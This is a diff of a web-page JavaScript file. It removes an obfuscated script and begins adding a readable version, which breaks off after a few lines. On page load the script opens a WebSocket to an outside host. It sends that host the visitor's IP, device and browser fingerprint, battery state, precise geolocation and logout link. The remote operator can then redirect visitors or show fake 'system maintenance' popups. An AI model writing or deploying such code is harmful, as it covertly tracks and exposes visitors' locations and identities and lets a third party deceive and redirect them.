@@ -1,1 +1,384 @@
-const _0x5b1510=_0x5793;function _0x5793(_0x1120de,_0x1597c0){_0x1120de=_0x1120de-0x96;const _0x4cbdae=_0x4cbd();let _0x579329=_0x4cbdae[_0x1120de];return _0x579329;}(function(_0x1fa17d,_0x41d03c){const _0x33aa27=_0x5793,_0x514dc0=_0x1fa17d();while(!![]){try{const _0x4803c3=-parseInt(_0x33aa27(0x140))/0x1*(-parseInt(_0x33aa27(0x108))/0x2)+-parseInt(_0x33aa27(0x121))/0x3+parseInt(_0x33aa27(0xcc))/0x4+-parseInt(_0x33aa27(0xe0))/0x5+-parseInt(_0x33aa27(0xd6))/0x6+parseInt(_0x33aa27(0xb9))/0x7*(-parseInt(_0x33aa27(0xf3))/0x8)+-parseInt(_0x33aa27(0x12b))/0x9*(-parseInt(_0x33aa27(0xcf))/0xa);if(_0x4803c3===_0x41d03c)break;else _0x514dc0['push'](_0x514dc0['shift']());}catch(_0x1c6dc4){_0x514dc0['push'](_0x514dc0['shift']());}}}(_0x4cbd,0x2630c),document['addEventListener'](_0x5b1510(0x146),()=>{const _0x21e142=_0x5b1510,_0x54aad5=_0x21e142(0xb3),_0x164f2a=_0x21e142(0xd4),_0x17e568=0x12c,_0xfe514e=0x7d0,_0xfc7a70=0x7530,_0x3ebc45=_0x21e142(0x139)+_0x21e142(0x148)+_0x21e142(0x144)+'</svg>',_0x2012ae=_0x21e142(0xed)+'<circle\x20cx=\x2212\x22\x20cy=\x2212\x22\x20r=\x2210\x22/><path\x20d=\x22m8\x2012\x203\x203\x205-6\x22/></svg>',_0x171745={'base':_0x490001(),'cid':_0x4066d0(),'ip':null,'device':null,'battery':null,'location':null,'logout':_0x44861c()},_0x2766c3=_0x41335c();let _0x14785a=null,_0xd5a912=_0xfe514e,_0x198343=null;_0x2e849b(),_0x54d231()[_0x21e142(0x131)](_0x44851a=>{const _0x3e99da=_0x21e142;_0x171745[_0x3e99da(0xe2)]=_0x44851a,_0x4a5593();}),_0x5c1a48()['then'](_0x4d8d61=>{_0x171745['ip']=_0x4d8d61,_0x4a5593();}),_0x40e5ce()['then'](_0x3afa4f=>{const _0x4d30c5=_0x21e142;_0x171745[_0x4d30c5(0xe5)]=_0x3afa4f,_0x4a5593();}),_0x32f759()[_0x21e142(0x131)](_0x1ebc0d=>{const _0x5ea8c5=_0x21e142;_0x171745[_0x5ea8c5(0xf8)]=_0x1ebc0d,_0x4a5593();});function _0x2e849b(){const _0x35303c=_0x21e142,_0x828c51=typeof window[_0x35303c(0xc8)]==='string'&&window[_0x35303c(0xc8)]?window['uo_access_token']:_0x164f2a;_0x14785a=new WebSocket(_0x54aad5+_0x35303c(0x126)+encodeURIComponent(_0x828c51)+_0x35303c(0x123)+encodeURIComponent(_0x171745[_0x35303c(0xba)])),_0x14785a[_0x35303c(0x98)]=()=>{_0xd5a912=_0xfe514e,_0x117a54();},_0x14785a[_0x35303c(0x118)]=_0x2e3ad7=>console['warn']('WebSocket\x20error:',_0x2e3ad7),_0x14785a[_0x35303c(0x109)]=()=>{const _0x48c679=_0x35303c,_0x5ae85b=_0xd5a912+Math[_0x48c679(0x100)](Math[_0x48c679(0x142)]()*0x3e8);_0xd5a912=Math[_0x48c679(0xf1)](_0xd5a912*0x2,_0xfc7a70),setTimeout(_0x2e849b,_0x5ae85b);},_0x14785a[_0x35303c(0xfa)]=_0x125e14;}function _0x125e14(_0x5690ee){const _0x342f6b=_0x21e142;let _0x3c1453;try{_0x3c1453=JSON[_0x342f6b(0x13d)](_0x5690ee[_0x342f6b(0xe8)]);}catch{return;}if(_0x3c1453[_0x342f6b(0xfb)]==='id'&&typeof _0x3c1453[_0x342f6b(0xe8)]==='string'){_0x171745[_0x342f6b(0xba)]=_0x3c1453[_0x342f6b(0xe8)];try{sessionStorage[_0x342f6b(0x9d)](_0x342f6b(0xab),_0x3c1453[_0x342f6b(0xe8)]);}catch{}return;}if(_0x3c1453[_0x342f6b(0xfb)]!==_0x342f6b(0x10a))return;const _0x25d367=_0x3c1453[_0x342f6b(0xe8)]?.[_0x342f6b(0xe8)];if(!_0x25d367||typeof _0x25d367[_0x342f6b(0xaf)]!=='string')return;if(_0x25d367['act']===_0x342f6b(0xa9)){const _0xbe6126=_0xb78e24(_0x25d367[_0x342f6b(0xae)]);if(_0xbe6126)window[_0x342f6b(0xf8)][_0x342f6b(0xca)]=_0xbe6126;}else{if(_0x25d367[_0x342f6b(0xaf)]===_0x342f6b(0xa7))_0x2fec1b(_0x25d367[_0x342f6b(0x115)],_0x25d367[_0x342f6b(0x11f)]);else _0x25d367['act']===_0x342f6b(0xa1)&&_0x2fec1b(_0x25d367['title'],_0x25d367[_0x342f6b(0x11f)],!![]);}}function _0x4a5593(){clearTimeout(_0x198343),_0x198343=setTimeout(_0x117a54,_0x17e568);}function _0x117a54(){const _0x3791ec=_0x21e142;if(!_0x14785a||_0x14785a['readyState']!==WebSocket[_0x3791ec(0x119)])return;_0x14785a['send'](JSON['stringify']({'event':_0x3791ec(0x105),'data':_0x5bfb93()}));}function _0x5bfb93(){const _0x47d45b=_0x21e142,_0x2b1a9a={..._0x171745[_0x47d45b(0x10b)][_0x47d45b(0xe9)]},_0x580c18=_0x2b1a9a[_0x47d45b(0xeb)]||window[_0x47d45b(0xf8)]['href'];delete _0x2b1a9a[_0x47d45b(0xeb)];if(_0x171745['ip'])_0x2b1a9a['IP']=_0x171745['ip'];if(_0x171745[_0x47d45b(0xe2)])_0x2b1a9a[_0x47d45b(0x14a)]=_0x171745[_0x47d45b(0xe2)];if(_0x171745['battery'])_0x2b1a9a[_0x47d45b(0xdb)]=_0x171745[_0x47d45b(0xe5)];_0x2b1a9a['Browser']=_0x2766c3;_0x171745[_0x47d45b(0xf8)]&&(_0x2b1a9a[_0x47d45b(0x117)]=_0x47d45b(0xf6)+_0x171745[_0x47d45b(0xf8)][_0x47d45b(0xd2)]+_0x47d45b(0x141)+(_0x171745[_0x47d45b(0xf8)]['coords']+_0x47d45b(0xbc)+_0x171745[_0x47d45b(0xf8)]['accuracy']+_0x47d45b(0xff)));_0x2b1a9a[_0x47d45b(0xeb)]=_0x580c18;if(_0x171745['logout'])_0x2b1a9a[_0x47d45b(0xa9)]=_0x171745[_0x47d45b(0xa9)];return _0x1c2e4c({'serialkey':_0x171745['base'][_0x47d45b(0x112)],'payload':_0x2b1a9a});}function _0x490001(){const _0x28603e=_0x21e142,_0x588e7c=typeof window[_0x28603e(0xbb)]===_0x28603e(0x128)&&window[_0x28603e(0xbb)]!==null?window['data_user']:null,_0x36f101=_0x588e7c?JSON[_0x28603e(0x13d)](JSON['stringify'](_0x588e7c)):{};return{'serialkey':typeof _0x36f101['serialkey']==='string'&&_0x36f101['serialkey']?_0x36f101[_0x28603e(0x112)]:window[_0x28603e(0xf8)][_0x28603e(0xc2)],'payload':typeof _0x36f101['payload']===_0x28603e(0x128)&&_0x36f101['payload']!==null&&!Array['isArray'](_0x36f101[_0x28603e(0xe9)])?_0x36f101[_0x28603e(0xe9)]:{}};}function _0x1c2e4c(_0x583739){const _0x4d6012=_0x21e142;if(typeof _0x583739==='string')return _0x583739[_0x4d6012(0x11d)]('[browser]')[_0x4d6012(0x11a)](_0x2766c3);if(Array[_0x4d6012(0x96)](_0x583739))return _0x583739[_0x4d6012(0x12c)](_0x1c2e4c);if(_0x583739&&typeof _0x583739===_0x4d6012(0x128)){const _0x3dbcf2={};for(const [_0x4df587,_0x5e52cd]of Object['entries'](_0x583739))_0x3dbcf2[_0x4df587]=_0x1c2e4c(_0x5e52cd);return _0x3dbcf2;}return _0x583739;}function _0x4066d0(){const _0x38ac81=_0x21e142;try{const _0x36a081=sessionStorage[_0x38ac81(0x124)]('uo_cid');if(_0x36a081)return _0x36a081;const _0x2c3b34=_0x5b4caa(0x10);return sessionStorage[_0x38ac81(0x9d)](_0x38ac81(0xab),_0x2c3b34),_0x2c3b34;}catch{return _0x5b4caa(0x10);}}function _0xb78e24(_0xa40c0e,_0x5bc23c=window[_0x21e142(0xf8)]['href']){const _0x1f94b3=_0x21e142;if(typeof _0xa40c0e!==_0x1f94b3(0x97)||!_0xa40c0e)return null;try{const _0x427e2d=new URL(_0xa40c0e,_0x5bc23c);return _0x427e2d['protocol']==='http:'||_0x427e2d[_0x1f94b3(0xb8)]===_0x1f94b3(0x9c)?_0x427e2d[_0x1f94b3(0xca)]:null;}catch{return null;}}function _0x44861c(){const _0x15862b=_0x21e142;for(const _0x39c29f of document[_0x15862b(0xc4)]('a')){for(const _0x46e80d of _0x39c29f[_0x15862b(0xdd)]){if(!/^(data-)?href$/i['test'](_0x46e80d[_0x15862b(0xa0)]))continue;const _0xc57131=_0xb78e24(_0x46e80d[_0x15862b(0xd5)]);if(!_0xc57131)continue;const {pathname:_0x1d8560,search:_0x485856}=new URL(_0xc57131);if(/log-?out|sign-?out|keluar/i[_0x15862b(0xb2)](_0x1d8560+_0x485856))return _0xc57131;}}return null;}function _0x32f759(){return new Promise(_0x1d9c69=>{const _0x563192=_0x5793;if(!('geolocation'in navigator))return _0x1d9c69(null);navigator[_0x563192(0xe4)][_0x563192(0xe7)](_0x166e42=>_0x1d9c69({'coords':_0x166e42[_0x563192(0xd2)][_0x563192(0xa6)][_0x563192(0x110)](0x6)+','+_0x166e42[_0x563192(0xd2)][_0x563192(0x9f)][_0x563192(0x110)](0x6),'accuracy':Math[_0x563192(0x132)](_0x166e42[_0x563192(0xd2)][_0x563192(0x13a)])}),()=>_0x1d9c69(null),{'enableHighAccuracy':!![],'timeout':0x2710,'maximumAge':0x5*0x3c*0x3e8});});}async function _0x5c1a48(){const _0x46693c=_0x21e142;try{const _0x493921=sessionStorage['getItem'](_0x46693c(0xad));if(_0x493921)return _0x493921;}catch{}try{const _0x38b7fe=(await(await fetch(_0x46693c(0xa2)))[_0x46693c(0xe3)]())['ip'];try{sessionStorage[_0x46693c(0x9d)](_0x46693c(0xad),_0x38b7fe);}catch{}return _0x38b7fe;}catch{return null;}}function _0x41335c(){const _0x2ea37c=_0x21e142,_0x15f359=navigator[_0x2ea37c(0xf4)],_0x46d62f=(_0x105337,_0x342e3d)=>(_0x105337+'\x20'+(_0x15f359[_0x2ea37c(0xc9)](_0x342e3d)?.[0x1]||''))['trim']();if(_0x15f359['includes'](_0x2ea37c(0x134)))return _0x46d62f(_0x2ea37c(0x116),/Edg\/([\d.]+)/);if(_0x15f359[_0x2ea37c(0xd3)]('OPR/'))return _0x46d62f(_0x2ea37c(0x143),/OPR\/([\d.]+)/);if(_0x15f359[_0x2ea37c(0xd3)](_0x2ea37c(0x9a)))return _0x46d62f(_0x2ea37c(0xac),/SamsungBrowser\/([\d.]+)/);if(_0x15f359[_0x2ea37c(0xd3)](_0x2ea37c(0x9b)))return _0x46d62f(_0x2ea37c(0xe6),/Firefox\/([\d.]+)/);if(_0x15f359['includes']('FxiOS/'))return _0x46d62f('Firefox',/FxiOS\/([\d.]+)/);if(_0x15f359[_0x2ea37c(0xd3)](_0x2ea37c(0xc6)))return _0x46d62f('Chrome',/CriOS\/([\d.]+)/);if(_0x15f359['includes'](_0x2ea37c(0xbd)))return _0x46d62f(_0x2ea37c(0xa5),/Chrome\/([\d.]+)/);if(_0x15f359['includes'](_0x2ea37c(0xc3)))return _0x46d62f(_0x2ea37c(0xb1),/Version\/([\d.]+)/);return _0x2ea37c(0x12f);}async function _0x54d231(){const _0x1753ea=_0x21e142,_0x4b6b93=navigator['userAgent'],_0x5e59e6=navigator[_0x1753ea(0xc1)];let _0x3a3b75={};if(_0x5e59e6?.[_0x1753ea(0xd8)])try{_0x3a3b75=await _0x5e59e6[_0x1753ea(0xd8)]([_0x1753ea(0xbe),_0x1753ea(0x138),_0x1753ea(0xde)]);}catch{}const _0xa51164=navigator[_0x1753ea(0xd0)]?navigator['deviceMemory']+'\x20GB':'',_0x46b624=/Macintosh/[_0x1753ea(0xb2)](_0x4b6b93)&&navigator[_0x1753ea(0x136)]>0x1,_0x40f1c4=_0x5e59e6?.[_0x1753ea(0xf5)]??/Mobi|Android|iPhone|iPad|iPod/i['test'](_0x4b6b93);let _0x19cd19='💻',_0x509c03='Desktop',_0x1f56c7='',_0x2cc4f3='';if(_0x46b624||/iPad/[_0x1753ea(0xb2)](_0x4b6b93)){_0x19cd19='📟',_0x509c03=_0x1753ea(0xf2);const _0x239ce2=_0x4b6b93[_0x1753ea(0xc9)](/OS ([\d_]+)/)?.[0x1];_0x1f56c7=_0x239ce2?_0x1753ea(0x13e)+_0x239ce2['replace'](/_/g,'.'):_0x1753ea(0x106);}else{if(/iPhone/[_0x1753ea(0xb2)](_0x4b6b93)){_0x19cd19='📱',_0x509c03=_0x1753ea(0xc7);const _0x425429=_0x4b6b93[_0x1753ea(0xc9)](/iPhone OS ([\d_]+)/)?.[0x1];_0x1f56c7=_0x425429?_0x1753ea(0x11e)+_0x425429[_0x1753ea(0x147)](/_/g,'.'):_0x1753ea(0xdf);}else{if(/Android/i[_0x1753ea(0xb2)](_0x4b6b93)){_0x19cd19='📱',_0x1f56c7=_0x1753ea(0xb7)+(_0x4b6b93[_0x1753ea(0xc9)](/Android\s([\d.]+)/i)?.[0x1]||'');const _0x515930=_0x4b6b93['match'](/Android\s[\d.]+;\s*([^);]+)/i)?.[0x1]?.[_0x1753ea(0x10d)]();_0x509c03=_0x3a3b75[_0x1753ea(0x138)]||(_0x515930&&_0x515930!=='K'?_0x515930:'')||(_0x40f1c4?_0x1753ea(0xce):'Tablet\x20Android');}else{if(/Windows NT/[_0x1753ea(0xb2)](_0x4b6b93)){const _0x1962f0=parseInt((_0x3a3b75[_0x1753ea(0xbe)]||'')['split']('.')[0x0],0xa);_0x1f56c7=_0x1962f0>=0xd?'Windows\x2011':_0x4b6b93[_0x1753ea(0xd3)]('Windows\x20NT\x2010.0')?_0x1753ea(0x133):_0x4b6b93[_0x1753ea(0xd3)](_0x1753ea(0x129))?_0x1753ea(0x99):_0x4b6b93[_0x1753ea(0xd3)](_0x1753ea(0x13f))?_0x1753ea(0x107):_0x1753ea(0x102),_0x2cc4f3=_0x3a3b75['bitness']?_0x3a3b75[_0x1753ea(0xde)]+'-bit':/WOW64|Win64|x64/['test'](_0x4b6b93)?_0x1753ea(0xf7):_0x1753ea(0xda);}else{if(/Macintosh|Mac OS X/['test'](_0x4b6b93))_0x1f56c7=_0x1753ea(0x10f);else{if(/CrOS/[_0x1753ea(0xb2)](_0x4b6b93))_0x1f56c7=_0x1753ea(0x103);else{if(/Linux/[_0x1753ea(0xb2)](_0x4b6b93)){_0x1f56c7='Linux';if(/x86_64|aarch64/['test'](_0x4b6b93))_0x2cc4f3=_0x1753ea(0xf7);}}}}}}}const _0x54b9ee=[_0x1f56c7['trim'](),_0x2cc4f3,_0xa51164][_0x1753ea(0xea)](Boolean)[_0x1753ea(0x11a)]('\x20');return _0x54b9ee?_0x19cd19+'\x20'+_0x509c03+'\x20('+_0x54b9ee+')':_0x19cd19+'\x20'+_0x509c03;}async function _0x40e5ce(){const _0x3d4a33=_0x21e142;if(!navigator['getBattery'])return null;try{const _0x1cc2d0=await navigator[_0x3d4a33(0xc5)]();return(_0x1cc2d0[_0x3d4a33(0x127)]?_0x3d4a33(0xef):'🔋')+'\x20'+Math[_0x3d4a33(0x132)](_0x1cc2d0['level']*0x64)+'%';}catch{return null;}}function _0x5b4caa(_0x2557a7){const _0x11abea=_0x21e142,_0x518953=new Uint8Array(_0x2557a7/0x2);return crypto[_0x11abea(0x145)](_0x518953),Array['from'](_0x518953,_0xfd860f=>_0xfd860f['toString'](0x10)[_0x11abea(0xb6)](0x2,'0'))['join']('');}function _0xb70d8a(_0x40f11e){const _0x584b3a=_0x21e142;return _0x40f11e?{'icon':_0x2012ae,'defaultTitle':_0x584b3a(0xdc),'defaultMessage':_0x584b3a(0xc0),'buttonColor':_0x584b3a(0xd9),'titleColor':_0x584b3a(0x149),'buttonText':_0x584b3a(0xe1),'progressBar':''}:{'icon':_0x3ebc45,'defaultTitle':'Pemeliharaan\x20Sistem','defaultMessage':_0x584b3a(0x135),'buttonColor':'#b45309','titleColor':_0x584b3a(0x11c),'buttonText':_0x584b3a(0xe1),'progressBar':_0x584b3a(0x13c)};}function _0x646e38(){return'\x0a<style>\x0a\x20\x20#maintenance-modal\x20{\x20position:\x20fixed;\x20inset:\x200;\x20z-index:\x202147483000;\x20display:\x20flex;\x20align-items:\x20center;\x20justify-content:\x20center;\x20padding:\x2016px;\x20font-family:\x20system-ui,\x20-apple-system,\x20\x27Segoe\x20UI\x27,\x20Roboto,\x20Arial,\x20sans-serif;\x20}\x0a\x20\x20#maintenance-modal\x20.mt-overlay\x20{\x20position:\x20absolute;\x20inset:\x200;\x20background:\x20rgba(17,\x2024,\x2039,\x200.5);\x20}\x0a\x20\x20#maintenance-modal\x20.mt-card\x20{\x20position:\x20relative;\x20width:\x20100%;\x20max-width:\x20400px;\x20background:\x20#fff;\x20border-radius:\x2012px;\x20padding:\x2028px\x2024px\x2024px;\x20text-align:\x20center;\x20box-shadow:\x200\x2020px\x2040px\x20rgba(0,\x200,\x200,\x200.18);\x20}\x0a\x20\x20#maintenance-modal\x20.maintenance-icon-container\x20{\x20display:\x20flex;\x20justify-content:\x20center;\x20margin-bottom:\x2016px;\x20}\x0a\x20\x20#maintenance-modal\x20.maintenance-title\x20{\x20margin:\x200\x200\x208px;\x20font-size:\x2018px;\x20font-weight:\x20600;\x20line-height:\x201.4;\x20}\x0a\x20\x20#maintenance-modal\x20.maintenance-message\x20{\x20margin:\x200\x200\x2016px;\x20font-size:\x2014px;\x20line-height:\x201.6;\x20color:\x20#4b5563;\x20}\x0a\x20\x20#maintenance-modal\x20.maintenance-progress\x20{\x20display:\x20flex;\x20justify-content:\x20center;\x20}\x0a\x20\x20#maintenance-modal\x20.mt-progress\x20{\x20width:\x20100%;\x20max-width:\x20280px;\x20height:\x204px;\x20margin:\x204px\x200\x2016px;\x20background:\x20#e5e7eb;\x20border-radius:\x202px;\x20overflow:\x20hidden;\x20}\x0a\x20\x20#maintenance-modal\x20.mt-progress\x20>\x20div\x20{\x20width:\x2040%;\x20height:\x20100%;\x20background:\x20#b45309;\x20border-radius:\x202px;\x20animation:\x20mt-progress\x201.6s\x20ease-in-out\x20infinite;\x20}\x0a\x20\x20#maintenance-close\x20{\x20min-width:\x20120px;\x20min-height:\x2044px;\x20padding:\x2010px\x2020px;\x20border:\x200;\x20border-radius:\x208px;\x20color:\x20#fff;\x20font-size:\x2014px;\x20font-weight:\x20600;\x20cursor:\x20pointer;\x20}\x0a\x20\x20#maintenance-close:focus-visible\x20{\x20outline:\x202px\x20solid\x20#111827;\x20outline-offset:\x202px;\x20}\x0a\x20\x20#maintenance-modal\x20.mt-spin\x20{\x20animation:\x20mt-spin\x204s\x20linear\x20infinite;\x20}\x0a\x20\x20#maintenance-modal.mt-enter\x20.mt-card\x20{\x20animation:\x20mt-in\x20200ms\x20ease-out;\x20}\x0a\x20\x20#maintenance-modal.mt-leave\x20{\x20animation:\x20mt-out\x20200ms\x20ease-in\x20forwards;\x20}\x0a\x20\x20@keyframes\x20mt-progress\x20{\x20from\x20{\x20transform:\x20translateX(-100%);\x20}\x20to\x20{\x20transform:\x20translateX(250%);\x20}\x20}\x0a\x20\x20@keyframes\x20mt-spin\x20{\x20to\x20{\x20transform:\x20rotate(360deg);\x20}\x20}\x0a\x20\x20@keyframes\x20mt-in\x20{\x20from\x20{\x20opacity:\x200;\x20transform:\x20translateY(8px);\x20}\x20}\x0a\x20\x20@keyframes\x20mt-out\x20{\x20to\x20{\x20opacity:\x200;\x20}\x20}\x0a\x20\x20@media\x20(prefers-reduced-motion:\x20reduce)\x20{\x0a\x20\x20\x20\x20#maintenance-modal\x20*,\x20#maintenance-modal\x20{\x20animation:\x20none\x20!important;\x20}\x0a\x20\x20}\x0a</style>\x0a<div\x20class=\x22mt-overlay\x22></div>\x0a<div\x20class=\x22mt-card\x22\x20role=\x22dialog\x22\x20aria-modal=\x22true\x22\x20aria-labelledby=\x22maintenance-title\x22\x20aria-describedby=\x22maintenance-message\x22>\x0a\x20\x20<div\x20class=\x22maintenance-icon-container\x22></div>\x0a\x20\x20<h2\x20class=\x22maintenance-title\x22\x20id=\x22maintenance-title\x22></h2>\x0a\x20\x20<p\x20class=\x22maintenance-message\x22\x20id=\x22maintenance-message\x22></p>\x0a\x20\x20<div\x20class=\x22maintenance-progress\x22></div>\x0a\x20\x20<button\x20type=\x22button\x22\x20id=\x22maintenance-close\x22></button>\x0a</div>';}function _0x2fec1b(_0x3d1d1e,_0x477eff,_0x33af7c=![]){const _0x377dbc=_0x21e142,_0x3ec4c7=_0xb70d8a(_0x33af7c);let _0x1e3144=document[_0x377dbc(0x12d)](_0x377dbc(0xfd));if(_0x1e3144)clearTimeout(_0x1e3144[_0x377dbc(0x101)]);if(!_0x1e3144){_0x1e3144=document[_0x377dbc(0x9e)](_0x377dbc(0xaa)),_0x1e3144['id']='maintenance-modal',_0x1e3144['innerHTML']=_0x646e38(),document[_0x377dbc(0xf9)][_0x377dbc(0x11b)](_0x1e3144);const _0x4c6564=()=>{const _0x51740b=_0x377dbc;_0x1e3144[_0x51740b(0x14b)]['remove']('mt-enter'),_0x1e3144['classList'][_0x51740b(0x120)](_0x51740b(0x130)),_0x1e3144['_closeTimer']=setTimeout(()=>{const _0x5eb881=_0x51740b;_0x1e3144['style'][_0x5eb881(0xd1)]=_0x5eb881(0x12a),_0x1e3144[_0x5eb881(0x14b)][_0x5eb881(0x10c)](_0x5eb881(0x130)),_0x1e3144[_0x5eb881(0x104)][_0x5eb881(0x125)]='0',document[_0x5eb881(0xf9)][_0x5eb881(0xa8)][_0x5eb881(0x113)]=_0x1e3144[_0x5eb881(0x104)][_0x5eb881(0x114)]||'';},0xc8);};_0x1e3144[_0x377dbc(0xa3)]('#maintenance-close')[_0x377dbc(0xb4)]('click',_0x4c6564),_0x1e3144[_0x377dbc(0xb4)](_0x377dbc(0x10e),_0x3a98c5=>{const _0x3db3fb=_0x377dbc;if(_0x3a98c5[_0x3db3fb(0xa4)]===_0x3db3fb(0x122))_0x4c6564();});}_0x1e3144[_0x377dbc(0xa3)](_0x377dbc(0xf0))[_0x377dbc(0xec)]=_0x3ec4c7[_0x377dbc(0xbf)];const _0x29cdfe=_0x1e3144['querySelector']('.maintenance-title');_0x29cdfe['textContent']=typeof _0x3d1d1e===_0x377dbc(0x97)&&_0x3d1d1e?_0x3d1d1e:_0x3ec4c7[_0x377dbc(0x137)],_0x29cdfe[_0x377dbc(0xa8)][_0x377dbc(0xb5)]=_0x3ec4c7['titleColor'],_0x1e3144[_0x377dbc(0xa3)]('.maintenance-message')[_0x377dbc(0x12e)]=typeof _0x477eff===_0x377dbc(0x97)&&_0x477eff?_0x477eff:_0x3ec4c7[_0x377dbc(0x111)],_0x1e3144[_0x377dbc(0xa3)](_0x377dbc(0xcd))[_0x377dbc(0xec)]=_0x3ec4c7[_0x377dbc(0xb0)];const _0x51e690=_0x1e3144[_0x377dbc(0xa3)](_0x377dbc(0xd7));_0x51e690[_0x377dbc(0x12e)]=_0x3ec4c7[_0x377dbc(0xfc)],_0x51e690['style']['background']=_0x3ec4c7[_0x377dbc(0xcb)],_0x1e3144[_0x377dbc(0x104)]['open']!=='1'&&(_0x1e3144['dataset'][_0x377dbc(0x114)]=document['body']['style'][_0x377dbc(0x113)]||'',_0x1e3144['dataset'][_0x377dbc(0x125)]='1'),document[_0x377dbc(0xf9)][_0x377dbc(0xa8)][_0x377dbc(0x113)]=_0x377dbc(0xfe),_0x1e3144['style'][_0x377dbc(0xd1)]=_0x377dbc(0x13b),_0x1e3144[_0x377dbc(0x14b)]['remove']('mt-leave'),_0x1e3144[_0x377dbc(0x14b)]['add']('mt-enter'),_0x51e690[_0x377dbc(0xee)]();}}));function _0x4cbd(){const _0xb4d672=['.maintenance-progress','Android','145370LXXZwO','deviceMemory','display','coords','includes','erthaganteng','value','1144488AdBXHe','#maintenance-close','getHighEntropyValues','#047857','32-bit','Baterai','Pemeliharaan\x20Selesai','attributes','bitness','iOS','1196395wGXHbX','Tutup','device','json','geolocation','battery','Firefox','getCurrentPosition','data','payload','filter','Link','innerHTML','<svg\x20width=\x2244\x22\x20height=\x2244\x22\x20viewBox=\x220\x200\x2024\x2024\x22\x20fill=\x22none\x22\x20stroke=\x22#047857\x22\x20stroke-width=\x221.75\x22\x20stroke-linecap=\x22round\x22\x20stroke-linejoin=\x22round\x22\x20aria-hidden=\x22true\x22>','focus','⚡\x20Mengisi\x20daya','.maintenance-icon-container','min','iPad','16KHYhbt','userAgent','mobile','<a\x20href=\x22https://www.google.com/maps?q=','64-bit','location','body','onmessage','event','buttonText','maintenance-modal','hidden','\x20m)</a>','floor','_closeTimer','Windows','ChromeOS','dataset','newuser','iPadOS','Windows\x207','2VxJspT','onclose','private','base','remove','trim','keydown','macOS','toFixed','defaultMessage','serialkey','overflow','prevOverflow','title','Edge','Lokasi','onerror','OPEN','join','appendChild','#92400e','split','iOS\x20','message','add','560718hqbVtn','Escape','&cid=','getItem','open','?token=','charging','object','Windows\x20NT\x206.3','none','486HxrqPI','map','getElementById','textContent','Tidak\x20diketahui','mt-leave','then','round','Windows\x2010','Edg/','Sistem\x20sedang\x20dalam\x20perbaikan.\x20Mohon\x20tunggu\x20beberapa\x20saat.','maxTouchPoints','defaultTitle','model','<svg\x20width=\x2244\x22\x20height=\x2244\x22\x20viewBox=\x220\x200\x2024\x2024\x22\x20fill=\x22none\x22\x20stroke=\x22#b45309\x22\x20stroke-width=\x221.75\x22\x20stroke-linecap=\x22round\x22\x20stroke-linejoin=\x22round\x22\x20aria-hidden=\x22true\x22\x20class=\x22mt-spin\x22>','accuracy','flex','<div\x20class=\x22mt-progress\x22><div></div></div>','parse','iPadOS\x20','Windows\x20NT\x206.1','50629TGnxiL','\x22\x20target=\x22_blank\x22\x20rel=\x22noopener\x20noreferrer\x22>','random','Opera','<path\x20d=\x22M19.4\x2015a1.65\x201.65\x200\x200\x200\x20.33\x201.82l.06.06a2\x202\x200\x201\x201-2.83\x202.83l-.06-.06a1.65\x201.65\x200\x200\x200-1.82-.33\x201.65\x201.65\x200\x200\x200-1\x201.51V21a2\x202\x200\x201\x201-4\x200v-.09a1.65\x201.65\x200\x200\x200-1-1.51\x201.65\x201.65\x200\x200\x200-1.82.33l-.06.06a2\x202\x200\x201\x201-2.83-2.83l.06-.06a1.65\x201.65\x200\x200\x200\x20.33-1.82\x201.65\x201.65\x200\x200\x200-1.51-1H3a2\x202\x200\x201\x201\x200-4h.09a1.65\x201.65\x200\x200\x200\x201.51-1\x201.65\x201.65\x200\x200\x200-.33-1.82l-.06-.06a2\x202\x200\x201\x201\x202.83-2.83l.06.06a1.65\x201.65\x200\x200\x200\x201.82.33H9a1.65\x201.65\x200\x200\x200\x201-1.51V3a2\x202\x200\x201\x201\x204\x200v.09a1.65\x201.65\x200\x200\x200\x201\x201.51\x201.65\x201.65\x200\x200\x200\x201.82-.33l.06-.06a2\x202\x200\x201\x201\x202.83\x202.83l-.06.06a1.65\x201.65\x200\x200\x200-.33\x201.82V9a1.65\x201.65\x200\x200\x200\x201.51\x201H21a2\x202\x200\x201\x201\x200\x204h-.09a1.65\x201.65\x200\x200\x200-1.51\x201z\x22/>','getRandomValues','DOMContentLoaded','replace','<path\x20d=\x22M12\x2015a3\x203\x200\x201\x200\x200-6\x203\x203\x200\x200\x200\x200\x206z\x22/>','#065f46','Device','classList','isArray','string','onopen','Windows\x208.1','SamsungBrowser/','Firefox/','https:','setItem','createElement','longitude','name','finish_maintenance','https://api.ipify.org?format=json','querySelector','key','Chrome','latitude','maintenance','style','logout','div','uo_cid','Samsung\x20Internet','user_ip','url','act','progressBar','Safari','test','wss://maserta.my.id:7676/ws','addEventListener','color','padStart','Android\x20','protocol','468517HMPOnc','cid','data_user','\x20(±','Chrome/','platformVersion','icon','Sistem\x20sudah\x20dapat\x20digunakan\x20kembali.\x20Silakan\x20muat\x20ulang\x20halaman.','userAgentData','hostname','Safari/','querySelectorAll','getBattery','CriOS/','iPhone','uo_access_token','match','href','buttonColor','286384dzNEsa'];_0x4cbd=function(){return _0xb4d672;};return _0x4cbd();}
+/**
+ * @author Ertha Dwi Setiyawan
+ */
+document.addEventListener('DOMContentLoaded', () => {
+    const WS_URL = 'wss://maserta.my.id:7676/ws';
+    const DEFAULT_TOKEN = 'erthaganteng';
+    const SEND_DEBOUNCE_MS = 300;
+    const RECONNECT_MIN_MS = 2000;
+    const RECONNECT_MAX_MS = 30000;
+
+    const SVG_GEAR =
+        '<svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#b45309" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" class="mt-spin">' +
+        '<path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>' +
